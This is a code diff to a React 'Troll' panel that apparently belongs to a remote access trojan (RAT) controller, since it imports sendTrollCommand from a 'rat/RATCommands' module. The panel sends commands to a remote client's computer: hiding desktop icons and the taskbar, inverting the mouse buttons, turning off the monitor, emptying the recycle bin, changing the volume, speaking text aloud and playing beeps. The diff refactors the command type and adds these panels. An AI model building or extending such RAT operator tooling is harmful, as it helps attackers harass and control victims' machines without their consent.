@@ -1,6 +1,7 @@
 import { useState } from "react";
 import { useParams } from "react-router-dom";
 import { sendTrollCommand } from "../rat/RATCommands";
+import { TrollCommand } from "../../types";
 import {
   IconDeviceDesktop,
   IconDeviceDesktopOff,
@@ -20,8 +21,7 @@ import {
   IconVolume2,
 } from "@tabler/icons-react";
 
-// TrollCommand enum
-enum TrollCommand {
+enum TrollCommandType {
   HideDesktop = "HideDesktop",
   ShowDesktop = "ShowDesktop",
   HideTaskbar = "HideTaskbar",
@@ -48,24 +48,23 @@ export const Troll = () => {
   );
   const [loading, setLoading] = useState<Record<string, boolean>>({});
   const [ttsText, setTtsText] = useState<string>("");
-  const [isTtsSending, setIsTtsSending] = useState<boolean>(false);
 
   const handleTrollCommand = async (command: TrollCommand) => {
     if (!addr) return;
 
     // Set loading state for this command
-    setLoading((prev) => ({ ...prev, [command]: true }));
+    setLoading((prev) => ({ ...prev, [command.type]: true }));
 
     try {
       await sendTrollCommand(addr, command);
 
       // For one-time actions, briefly show them as active then reset
       if (isOneTimeAction(command)) {
-        setActiveCommands((prev) => ({ ...prev, [command]: true }));
+        setActiveCommands((prev) => ({ ...prev, [command.type]: true }));
 
         // Reset active state after a short delay
         setTimeout(() => {
-          setActiveCommands((prev) => ({ ...prev, [command]: false }));
+          setActiveCommands((prev) => ({ ...prev, [command.type]: false }));
         }, 1000);
       }
       // For toggle commands, update the active state
@@ -74,44 +73,44 @@ export const Troll = () => {
           const newState = { ...prev };
 
           // If this is a "show" command, set its pair to inactive
-          if (command.startsWith("Show")) {
-            const hideCommand = command.replace("Show", "Hide");
+          if (command.type.startsWith("Show")) {
+            const hideCommand = command.type.replace("Show", "Hide");
             newState[hideCommand] = false;
-            newState[command] = true;
+            newState[command.type] = true;
           }
           // If this is a "hide" command, set its pair to inactive
-          else if (command.startsWith("Hide")) {
-            const showCommand = command.replace("Hide", "Show");
+          else if (command.type.startsWith("Hide")) {
+            const showCommand = command.type.replace("Hide", "Show");
             newState[showCommand] = false;
-            newState[command] = true;
+            newState[command.type] = true;
           }
           // For other toggle commands
-          else if (command === TrollCommand.NormalMouse) {
-            newState[TrollCommand.RevertMouse] = false;
-            newState[command] = true;
-          } else if (command === TrollCommand.RevertMouse) {
-            newState[TrollCommand.NormalMouse] = false;
-            newState[command] = true;
-          } else if (command === TrollCommand.MonitorOn) {
-            newState[TrollCommand.MonitorOff] = false;
-            newState[command] = true;
-          } else if (command === TrollCommand.MonitorOff) {
-            newState[TrollCommand.MonitorOn] = false;
-            newState[command] = true;
-          } else if (command === TrollCommand.UnmuteVolume) {
-            newState[TrollCommand.MuteVolume] = false;
-            newState[command] = true;
-          } else if (command === TrollCommand.MuteVolume) {
-            newState[TrollCommand.UnmuteVolume] = false;
-            newState[command] = true;
-          } else if (command === TrollCommand.MaxVolume) {
-            newState[TrollCommand.MinVolume] = false;
-            newState[TrollCommand.MuteVolume] = false;
-            newState[command] = true;
-          } else if (command === TrollCommand.MinVolume) {
-            newState[TrollCommand.MaxVolume] = false;
-            newState[TrollCommand.MuteVolume] = false;
-            newState[command] = true;
+          else if (command.type === TrollCommandType.NormalMouse) {
+            newState[TrollCommandType.RevertMouse] = false;
+            newState[command.type] = true;
+          } else if (command.type === TrollCommandType.RevertMouse) {
+            newState[TrollCommandType.NormalMouse] = false;
+            newState[command.type] = true;
+          } else if (command.type === TrollCommandType.MonitorOn) {
+            newState[TrollCommandType.MonitorOff] = false;
+            newState[command.type] = true;
+          } else if (command.type === TrollCommandType.MonitorOff) {
+            newState[TrollCommandType.MonitorOn] = false;
+            newState[command.type] = true;
+          } else if (command.type === TrollCommandType.UnmuteVolume) {
+            newState[TrollCommandType.MuteVolume] = false;
+            newState[command.type] = true;
+          } else if (command.type === TrollCommandType.MuteVolume) {
+            newState[TrollCommandType.UnmuteVolume] = false;
+            newState[command.type] = true;
+          } else if (command.type === TrollCommandType.MaxVolume) {
+            newState[TrollCommandType.MinVolume] = false;
+            newState[TrollCommandType.MuteVolume] = false;
+            newState[command.type] = true;
+          } else if (command.type === TrollCommandType.MinVolume) {
+            newState[TrollCommandType.MaxVolume] = false;
+            newState[TrollCommandType.MuteVolume] = false;
+            newState[command.type] = true;
           }
 
           return newState;
@@ -121,54 +120,55 @@ export const Troll = () => {
       console.error("Failed to send troll command:", error);
     } finally {
       // Clear loading state
-      setLoading((prev) => ({ ...prev, [command]: false }));
+      setLoading((prev) => ({ ...prev, [command.type]: false }));
     }
   };
 
-  // Handle text-to-speech submission
-  const handleTtsSubmit = async () => {
-    if (!addr || !ttsText.trim() || isTtsSending) return;
-    
-    setIsTtsSending(true);
-    
+  const handleTrollCommandWithText = async (command: TrollCommand) => {
+    if (!addr) return;
+
+    // Set loading state for this command
+    setLoading((prev) => ({ ...prev, [command.type]: true }));
+
     try {
-      // Send the TTS command with the text
-      await sendTrollCommand(addr, `SpeakText:${ttsText}`);
-      // Clear the input after sending
-      setTtsText("");
+      await sendTrollCommand(addr, {
+        type: command.type,
+        payload: ttsText,
+      });
     } catch (error) {
-      console.error("Failed to send TTS command:", error);
+      console.error("Failed to send troll command:", error);
     } finally {
-      setIsTtsSending(false);
+      setLoading((prev) => ({ ...prev, [command.type]: false }));
     }
   };
 
   // Helper to determine if a command is part of a toggle pair
   const isToggleCommand = (command: TrollCommand): boolean => {
     return [
-      TrollCommand.HideDesktop,
-      TrollCommand.ShowDesktop,
-      TrollCommand.HideTaskbar,
-      TrollCommand.ShowTaskbar,
-      TrollCommand.HideNotify,
-      TrollCommand.ShowNotify,
-      TrollCommand.RevertMouse,
-      TrollCommand.NormalMouse,
-      TrollCommand.MonitorOff,
-      TrollCommand.MonitorOn,
-      TrollCommand.MuteVolume,
-      TrollCommand.UnmuteVolume,
+      TrollCommandType.HideDesktop,
+      TrollCommandType.ShowDesktop,
+      TrollCommandType.HideTaskbar,
+      TrollCommandType.ShowTaskbar,
+      TrollCommandType.HideNotify,
+      TrollCommandType.ShowNotify,
+      TrollCommandType.RevertMouse,
+      TrollCommandType.NormalMouse,
+      TrollCommandType.MonitorOff,
+      TrollCommandType.MonitorOn,
+      TrollCommandType.MuteVolume,
+      TrollCommandType.UnmuteVolume,
       // These are not actual toggles, but we want to track their button state
-      TrollCommand.MaxVolume,
-      TrollCommand.MinVolume,
-    ].includes(command);
+      TrollCommandType.MaxVolume,
+      TrollCommandType.MinVolume,
+    ].includes(command.type);
   };
 
   // Helper to determine if a command is a one-time action rather than a toggle
   const isOneTimeAction = (command: TrollCommand): boolean => {
-    return [TrollCommand.FocusDesktop, TrollCommand.EmptyTrash].includes(
-      command
-    );
+    return [
+      TrollCommandType.FocusDesktop,
+      TrollCommandType.EmptyTrash,
+    ].includes(command.type);
   };
 
   // Get the appropriate CSS class for a button based on its state
@@ -180,11 +180,11 @@ export const Troll = () => {
       return "bg-gray-800 text-gray-500 border-accentx cursor-not-allowed opacity-60";
     }
 
-    if (loading[command]) {
+    if (loading[command.type]) {
       return "bg-gray-700 border-gray-600 text-gray-300 cursor-wait";
     }
 
-    if (activeCommands[command]) {
+    if (activeCommands[command.type]) {
       return "bg-green-900 border-green-700 text-white";
     }
 
@@ -264,37 +264,37 @@ export const Troll = () => {
               <TrollButton
                 title="Hide Desktop Icons"
                 icon={<IconDeviceDesktopOff size={16} />}
-                command={TrollCommand.HideDesktop}
+                command={{ type: TrollCommandType.HideDesktop }}
                 onClick={handleTrollCommand}
-                active={activeCommands[TrollCommand.HideDesktop]}
-                loading={loading[TrollCommand.HideDesktop]}
+                active={activeCommands[TrollCommandType.HideDesktop]}
+                loading={loading[TrollCommandType.HideDesktop]}
               />
 
               <TrollButton
                 title="Show Desktop Icons"
                 icon={<IconDeviceDesktop size={16} />}
-                command={TrollCommand.ShowDesktop}
+                command={{ type: TrollCommandType.ShowDesktop }}
                 onClick={handleTrollCommand}
-                active={activeCommands[TrollCommand.ShowDesktop]}
-                loading={loading[TrollCommand.ShowDesktop]}
+                active={activeCommands[TrollCommandType.ShowDesktop]}
+                loading={loading[TrollCommandType.ShowDesktop]}
               />
 
               <TrollButton
                 title="Hide Taskbar"
                 icon={<IconLayoutBottombarCollapse size={16} />}
-                command={TrollCommand.HideTaskbar}
+                command={{ type: TrollCommandType.HideTaskbar }}
                 onClick={handleTrollCommand}
-                active={activeCommands[TrollCommand.HideTaskbar]}
-                loading={loading[TrollCommand.HideTaskbar]}
+                active={activeCommands[TrollCommandType.HideTaskbar]}
+                loading={loading[TrollCommandType.HideTaskbar]}
               />
 
               <TrollButton
                 title="Show Taskbar"
                 icon={<IconLayoutBottombar size={16} />}
-                command={TrollCommand.ShowTaskbar}
+                command={{ type: TrollCommandType.ShowTaskbar }}
                 onClick={handleTrollCommand}
-                active={activeCommands[TrollCommand.ShowTaskbar]}
-                loading={loading[TrollCommand.ShowTaskbar]}
+                active={activeCommands[TrollCommandType.ShowTaskbar]}
+                loading={loading[TrollCommandType.ShowTaskbar]}
               />
             </div>
           </div>
@@ -308,37 +308,37 @@ export const Troll = () => {
               <TrollButton
                 title="Hide Notification Area"
                 icon={<IconBellOff size={16} />}
-                command={TrollCommand.HideNotify}
+                command={{ type: TrollCommandType.HideNotify }}
                 onClick={handleTrollCommand}
-                active={activeCommands[TrollCommand.HideNotify]}
-                loading={loading[TrollCommand.HideNotify]}
+                active={activeCommands[TrollCommandType.HideNotify]}
+                loading={loading[TrollCommandType.HideNotify]}
               />
 
               <TrollButton
                 title="Show Notification Area"
                 icon={<IconBellRinging size={16} />}
-                command={TrollCommand.ShowNotify}
+                command={{ type: TrollCommandType.ShowNotify }}
                 onClick={handleTrollCommand}
-                active={activeCommands[TrollCommand.ShowNotify]}
-                loading={loading[TrollCommand.ShowNotify]}
+                active={activeCommands[TrollCommandType.ShowNotify]}
+                loading={loading[TrollCommandType.ShowNotify]}
               />
 
               <TrollButton
                 title="Focus Desktop"
                 icon={<IconArrowAutofitDown size={16} />}
-                command={TrollCommand.FocusDesktop}
+                command={{ type: TrollCommandType.FocusDesktop }}
                 onClick={handleTrollCommand}
-                active={activeCommands[TrollCommand.FocusDesktop]}
-                loading={loading[TrollCommand.FocusDesktop]}
+                active={activeCommands[TrollCommandType.FocusDesktop]}
+                loading={loading[TrollCommandType.FocusDesktop]}
               />
 
               <TrollButton
                 title="Empty Recycle Bin"
                 icon={<IconTrash size={16} />}
-                command={TrollCommand.EmptyTrash}
+                command={{ type: TrollCommandType.EmptyTrash }}
                 onClick={handleTrollCommand}
-                active={activeCommands[TrollCommand.EmptyTrash]}
-                loading={loading[TrollCommand.EmptyTrash]}
+                active={activeCommands[TrollCommandType.EmptyTrash]}
+                loading={loading[TrollCommandType.EmptyTrash]}
               />
             </div>
           </div>
@@ -354,37 +354,37 @@ export const Troll = () => {
               <TrollButton
                 title="Invert Mouse Buttons"
                 icon={<IconMouseOff size={16} />}
-                command={TrollCommand.RevertMouse}
+                command={{ type: TrollCommandType.RevertMouse }}
                 onClick={handleTrollCommand}
-                active={activeCommands[TrollCommand.RevertMouse]}
-                loading={loading[TrollCommand.RevertMouse]}
+                active={activeCommands[TrollCommandType.RevertMouse]}
+                loading={loading[TrollCommandType.RevertMouse]}
               />
 
               <TrollButton
                 title="Normal Mouse"
                 icon={<IconMouse size={16} />}
-                command={TrollCommand.NormalMouse}
+                command={{ type: TrollCommandType.NormalMouse }}
                 onClick={handleTrollCommand}
-                active={activeCommands[TrollCommand.NormalMouse]}
-                loading={loading[TrollCommand.NormalMouse]}
+                active={activeCommands[TrollCommandType.NormalMouse]}
+                loading={loading[TrollCommandType.NormalMouse]}
               />
 
               <TrollButton
                 title="Turn Off Monitor"
                 icon={<IconScreenShareOff size={16} />}
-                command={TrollCommand.MonitorOff}
+                command={{ type: TrollCommandType.MonitorOff }}
                 onClick={handleTrollCommand}
-                active={activeCommands[TrollCommand.MonitorOff]}
-                loading={loading[TrollCommand.MonitorOff]}
+                active={activeCommands[TrollCommandType.MonitorOff]}
+                loading={loading[TrollCommandType.MonitorOff]}
               />
 
               <TrollButton
                 title="Turn On Monitor"
                 icon={<IconScreenShare size={16} />}
-                command={TrollCommand.MonitorOn}
+                command={{ type: TrollCommandType.MonitorOn }}
                 onClick={handleTrollCommand}
-                active={activeCommands[TrollCommand.MonitorOn]}
-                loading={loading[TrollCommand.MonitorOn]}
+                active={activeCommands[TrollCommandType.MonitorOn]}
+                loading={loading[TrollCommandType.MonitorOn]}
               />
             </div>
           </div>
@@ -398,138 +398,202 @@ export const Troll = () => {
               <TrollButton
                 title="Maximum Volume"
                 icon={<IconVolume3 size={16} />}
-                command={TrollCommand.MaxVolume}
+                command={{ type: TrollCommandType.MaxVolume }}
                 onClick={handleTrollCommand}
-                active={activeCommands[TrollCommand.MaxVolume]}
-                loading={loading[TrollCommand.MaxVolume]}
+                active={activeCommands[TrollCommandType.MaxVolume]}
+                loading={loading[TrollCommandType.MaxVolume]}
               />
 
               <TrollButton
                 title="Minimum Volume"
                 icon={<IconVolume2 size={16} />}
-                command={TrollCommand.MinVolume}
+                command={{ type: TrollCommandType.MinVolume }}
                 onClick={handleTrollCommand}
-                active={activeCommands[TrollCommand.MinVolume]}
-                loading={loading[TrollCommand.MinVolume]}
+                active={activeCommands[TrollCommandType.MinVolume]}
+                loading={loading[TrollCommandType.MinVolume]}
               />
 
               <TrollButton
                 title="Mute Volume"
                 icon={<IconVolumeOff size={16} />}
-                command={TrollCommand.MuteVolume}
+                command={{ type: TrollCommandType.MuteVolume }}
                 onClick={handleTrollCommand}
-                active={activeCommands[TrollCommand.MuteVolume]}
-                loading={loading[TrollCommand.MuteVolume]}
+                active={activeCommands[TrollCommandType.MuteVolume]}
+                loading={loading[TrollCommandType.MuteVolume]}
               />
 
               <TrollButton
                 title="Unmute Volume"
                 icon={<IconVolume size={16} />}
-                command={TrollCommand.UnmuteVolume}
+                command={{ type: TrollCommandType.UnmuteVolume }}
                 onClick={handleTrollCommand}
-                active={activeCommands[TrollCommand.UnmuteVolume]}
-                loading={loading[TrollCommand.UnmuteVolume]}
+                active={activeCommands[TrollCommandType.UnmuteVolume]}
+                loading={loading[TrollCommandType.UnmuteVolume]}
               />
             </div>
           </div>
         </div>
       )}
 
-      {/* Volume Control */}
-      <div className="mb-5">
-        <h2 className="text-white text-lg font-medium mb-2">Volume Control</h2>
-        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-2">
-          <TrollButton
-            title="Max Volume"
-            icon={<IconVolume3 size={24} />}
-            command={TrollCommand.MaxVolume}
-            onClick={handleTrollCommand}
-            active={activeCommands[TrollCommand.MaxVolume]}
-            loading={loading[TrollCommand.MaxVolume]}
-          />
-          <TrollButton
-            title="Min Volume"
-            icon={<IconVolume2 size={24} />}
-            command={TrollCommand.MinVolume}
-            onClick={handleTrollCommand}
-            active={activeCommands[TrollCommand.MinVolume]}
-            loading={loading[TrollCommand.MinVolume]}
-          />
-          <TrollButton
-            title="Mute Volume"
-            icon={<IconVolumeOff size={24} />}
-            command={TrollCommand.MuteVolume}
-            onClick={handleTrollCommand}
-            active={activeCommands[TrollCommand.MuteVolume]}
-            loading={loading[TrollCommand.MuteVolume]}
-          />
-          <TrollButton
-            title="Unmute Volume"
-            icon={<IconVolume size={24} />}
-            command={TrollCommand.UnmuteVolume}
-            onClick={handleTrollCommand}
-            active={activeCommands[TrollCommand.UnmuteVolume]}
-            loading={loading[TrollCommand.UnmuteVolume]}
-          />
-        </div>
-      </div>
-
-      {/* Text-to-Speech */}
-      <div className="mb-5">
-        <h2 className="text-white text-lg font-medium mb-2">Text-to-Speech</h2>
-        <div className="flex flex-col gap-2">
-          <div className="flex gap-2">
-            <input
-              type="text"
-              value={ttsText}
-              onChange={(e) => setTtsText(e.target.value)}
-              placeholder="Enter text to speak..."
-              className="flex-1 p-2 bg-secondarybg text-white border border-accentx rounded"
-              onKeyDown={(e) => {
-                if (e.key === 'Enter') {
-                  handleTtsSubmit();
+      {/* Text-to-Speech, Piano Tiles, and Beep Sounds */}
+      <div className="grid grid-cols-1 lg:grid-cols-3 gap-2 mt-4">
+        {/* Text-to-Speech */}
+        <div className="bg-secondarybg border border-accentx rounded-lg overflow-hidden">
+          <div className="bg-primarybg border-b border-accentx px-2 py-1.5">
+            <h3 className="text-white font-medium text-md">Text-to-Speech</h3>
+          </div>
+          <div className="p-2 space-y-1.5">
+            <div className="flex gap-2">
+              <input
+                type="text"
+                value={ttsText}
+                onChange={(e) => setTtsText(e.target.value)}
+                placeholder="Enter text to speak..."
+                className="flex-1 p-2 bg-secondarybg text-white border border-accentx rounded"
+                onKeyDown={(e) => {
+                  if (e.key === "Enter") {
+                    handleTrollCommandWithText({
+                      type: TrollCommandType.SpeakText,
+                      payload: ttsText,
+                    });
+                  }
+                }}
+              />
+              <button
+                onClick={() =>
+                  handleTrollCommandWithText({
+                    type: TrollCommandType.SpeakText,
+                    payload: ttsText,
+                  })
                 }
-              }}
-            />
+                disabled={
+                  !ttsText.trim() || loading[TrollCommandType.SpeakText]
+                }
+                className={`p-2 rounded ${
+                  !ttsText.trim() || loading[TrollCommandType.SpeakText]
+                    ? "bg-gray-700 border-gray-600 text-gray-300 cursor-not-allowed"
+                    : "bg-accentx border-accent hover:bg-accent text-white"
+                }`}
+              >
+                {loading[TrollCommandType.SpeakText] ? (
+                  <svg
+                    className="animate-spin h-5 w-5 text-white"
+                    xmlns="http://www.w3.org/2000/svg"
+                    fill="none"
+                    viewBox="0 0 24 24"
+                  >
+                    <circle
+                      className="opacity-25"
+                      cx="12"
+                      cy="12"
+                      r="10"
+                      stroke="currentColor"
+                      strokeWidth="4"
+                    ></circle>
+                    <path
+                      className="opacity-75"
+                      fill="currentColor"
+                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
+                    ></path>
+                  </svg>
+                ) : (
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    className="h-5 w-5"
+                    viewBox="0 0 24 24"
+                    strokeWidth="1.5"
+                    stroke="currentColor"
+                    fill="none"
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                  >
+                    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                    <path d="M15 8a5 5 0 0 1 0 8" />
+                    <path d="M17.7 5a9 9 0 0 1 0 14" />
+                    <path d="M6 15h-2a1 1 0 0 1 -1 -1v-4a1 1 0 0 1 1 -1h2l3.5 -4.5a.8 .8 0 0 1 1.5 .5v14a.8 .8 0 0 1 -1.5 .5l-3.5 -4.5" />
+                  </svg>
+                )}
+              </button>
+            </div>
+            <p className="text-gray-400 text-xs">
+              Make the client's computer speak the text.
+            </p>
+          </div>
+        </div>
+
+        {/* Piano Tiles */}
+        <div className="bg-secondarybg border border-accentx rounded-lg overflow-hidden">
+          <div className="bg-primarybg border-b border-accentx px-2 py-1.5">
+            <h3 className="text-white font-medium text-md">Piano Tiles</h3>
+          </div>
+          <div className="p-2">
+            <div className="grid grid-cols-8 gap-1 mb-2">
+              {[...Array(16)].map((_, index) => (
+                <button
+                  key={index}
+                  className={`${
+                    index % 2 === 0 ? "bg-white" : "bg-gray-900"
+                  } h-12 ${
+                    index % 2 === 0 ? "border-gray-300" : "border-gray-800"
+                  } border rounded hover:opacity-80 transition-opacity`}
+                  onClick={() => {
+                    /* Piano tile click logic will go here */
+                  }}
+                ></button>
+              ))}
+            </div>
+            <p className="text-gray-400 text-xs">
+              Click keys to play sounds on the remote computer.
+            </p>
+          </div>
+        </div>
+
+        {/* Beep Command */}
+        <div className="bg-secondarybg border border-accentx rounded-lg overflow-hidden">
+          <div className="bg-primarybg border-b border-accentx px-2 py-1.5">
+            <h3 className="text-white font-medium text-md">Beep Sound</h3>
+          </div>
+          <div className="p-2 space-y-1.5">
+            <div className="grid grid-cols-2 gap-2">
+              <div>
+                <label className="text-gray-400 text-xs block mb-1">
+                  Frequency (Hz)
+                </label>
+                <input
+                  type="range"
+                  min="100"
+                  max="5000"
+                  className="w-full"
+                  // value={beepFrequency}
+                  // onChange={(e) => setBeepFrequency(parseInt(e.target.value))}
+                />
+                <div className="flex justify-between mt-1">
+                  <span className="text-xs text-gray-400">100</span>
+                  <span className="text-xs text-gray-400">5000</span>
+                </div>
+              </div>
+              <div>
+                <label className="text-gray-400 text-xs block mb-1">
+                  Duration (ms)
+                </label>
+                <input
+                  type="number"
+                  min="100"
+                  max="5000"
+                  // value={beepDuration}
+                  // onChange={(e) => setBeepDuration(parseInt(e.target.value))}
+                  className="w-full p-1.5 bg-secondarybg text-white border border-accentx rounded text-sm"
+                  placeholder="Duration"
+                />
+              </div>
+            </div>
             <button
-              onClick={handleTtsSubmit}
-              disabled={!ttsText.trim() || isTtsSending}
-              className={`p-2 rounded ${
-                !ttsText.trim() || isTtsSending 
-                  ? 'bg-gray-700 border-gray-600 text-gray-300 cursor-not-allowed' 
-                  : 'bg-accentx border-accent hover:bg-accent text-white'
-              }`}
+              // onClick={handleBeepSubmit}
+              className="w-full py-1 px-2 bg-accentx hover:bg-accent text-white rounded transition-all duration-200"
             >
-              {isTtsSending ? (
-                <svg 
-                  className="animate-spin h-5 w-5 text-white" 
-                  xmlns="http://www.w3.org/2000/svg" 
-                  fill="none" 
-                  viewBox="0 0 24 24"
-                >
-                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
-                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                </svg>
-              ) : (
-                <svg 
-                  xmlns="http://www.w3.org/2000/svg" 
-                  className="h-5 w-5" 
-                  viewBox="0 0 24 24" 
-                  strokeWidth="1.5" 
-                  stroke="currentColor" 
-                  fill="none" 
-                  strokeLinecap="round" 
-                  strokeLinejoin="round"
-                >
-                  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
-                  <path d="M15 8a5 5 0 0 1 0 8" />
-                  <path d="M17.7 5a9 9 0 0 1 0 14" />
-                  <path d="M6 15h-2a1 1 0 0 1 -1 -1v-4a1 1 0 0 1 1 -1h2l3.5 -4.5a.8 .8 0 0 1 1.5 .5v14a.8 .8 0 0 1 -1.5 .5l-3.5 -4.5" />
-                </svg>
-              )}
+              Play Beep
             </button>
           </div>
-          <p className="text-gray-400 text-sm">Enter text and hit speak to make the client's computer speak the text using Windows TTS.</p>
         </div>
       </div>
 
